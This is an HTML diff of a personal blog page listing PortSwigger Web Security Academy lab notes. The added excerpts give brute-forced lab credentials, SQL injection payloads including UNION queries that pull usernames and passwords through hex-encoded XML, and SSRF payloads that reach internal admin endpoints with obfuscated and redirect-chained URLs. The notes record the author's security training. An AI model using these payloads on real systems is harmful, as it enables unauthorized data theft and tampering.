@@ -5,11 +5,11 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Categories | Lets Learn Together</title>
+<title>PortSwigger | Lets Learn Together</title>
 <meta name="keywords" content="">
-<meta name="description" content="">
+<meta name="description" content="PortSwigger - Lets Learn Together">
 <meta name="author" content="">
-<link rel="canonical" href="https://d31ty.github.io/categories/">
+<link rel="canonical" href="https://d31ty.github.io/portswigger/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.0648e40516ba181e370a81d24ab5a4b0683e67184fe1e7888524d0b7332ed31e.css" integrity="sha256-BkjkBRa6GB43CoHSSrWksGg&#43;ZxhP4eeIhSTQtzMu0x4=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://d31ty.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://d31ty.github.io/favicon-16x16.png">
@@ -18,7 +18,7 @@
 <link rel="mask-icon" href="https://d31ty.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="https://d31ty.github.io/categories/index.xml">
+<link rel="alternate" type="application/rss+xml" href="https://d31ty.github.io/portswigger/index.xml">
 <noscript>
     <style>
         #theme-toggle,
@@ -55,15 +55,30 @@
         }
 
     </style>
-</noscript><meta property="og:title" content="Categories" />
+</noscript><meta property="og:title" content="PortSwigger" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="website" />
-<meta property="og:url" content="https://d31ty.github.io/categories/" />
+<meta property="og:url" content="https://d31ty.github.io/portswigger/" />
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Categories"/>
+<meta name="twitter:title" content="PortSwigger"/>
 <meta name="twitter:description" content=""/>
 
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "PortSwigger",
+      "item": "https://d31ty.github.io/portswigger/"
+    }
+  ]
+}
+</script>
 </head>
 
 <body class="list" id="top">
@@ -118,7 +133,7 @@
             </li>
             <li>
                 <a href="https://d31ty.github.io/portswigger/" title="PortSwigger">
-                    <span>PortSwigger</span>
+                    <span class="active">PortSwigger</span>
                 </a>
             </li>
             <li>
@@ -129,13 +144,51 @@
         </ul>
     </nav>
 </header>
-<main class="main">
+<main class="main"> 
 <header class="page-header">
-    <h1>Categories</h1>
+  <h1>
+    PortSwigger
+  </h1>
 </header>
 
-<ul class="terms-tags">
-</ul>
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>Postswigger Server Based Attacks - Authentication
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Brute Force Lab 1: Username and Password Brute force: Username: accounts Password: robert Lab 2: Username and Password Brute force with the message from response: Username: oracle Password: soccer Username and Password Brute force with 30mins to retry: </p>
+  </div>
+  <footer class="entry-footer"><span title='2023-10-15 00:00:00 +0000 UTC'>October 15, 2023</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;d31ty</footer>
+  <a class="entry-link" aria-label="post link to Postswigger Server Based Attacks - Authentication" href="https://d31ty.github.io/portswigger/server-based/authentication/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>Postswigger Server Based Attacks - SQLi
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts&#39;&#43;OR&#43;1=1-- Lab 2: administrator&#39;-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT USERNAME FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;stockCheck&gt;&lt;productId&gt;1 &lt;/productId&gt;&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT PASSWORD FROM USERS&lt;@/hex_entities&gt;&lt;/storeId&gt;&lt;/stockCheck&gt; Other Solution:
+SQL | Concatenation Operator So the command is = SELECT USERNAME || ‘~’ || PASSWORD FROM USER
+Lesson Learned: If select * doesn’t work, then try enumerating the column names in SQLi...</p>
+  </div>
+  <footer class="entry-footer"><span title='2023-10-15 00:00:00 +0000 UTC'>October 15, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;d31ty</footer>
+  <a class="entry-link" aria-label="post link to Postswigger Server Based Attacks - SQLi" href="https://d31ty.github.io/portswigger/server-based/sqli/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>Postswigger Server Based Attacks - SSRF
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Lab 1: Basic SSRF - Delete user Carlos
+stockapi = http://localhost/admin/delete?username=carlos Lab 2: stockapi = http://192.168.0.4/admin/delete?username=carlos Lab 3: stockapi = http://127.1/%25%36%31dmin Lab 4: Lab 5: stockapi = /product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos </p>
+  </div>
+  <footer class="entry-footer"><span title='2023-10-15 00:00:00 +0000 UTC'>October 15, 2023</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;d31ty</footer>
+  <a class="entry-link" aria-label="post link to Postswigger Server Based Attacks - SSRF" href="https://d31ty.github.io/portswigger/server-based/ssrf/"></a>
+</article>
     </main>
     
 <footer class="footer">
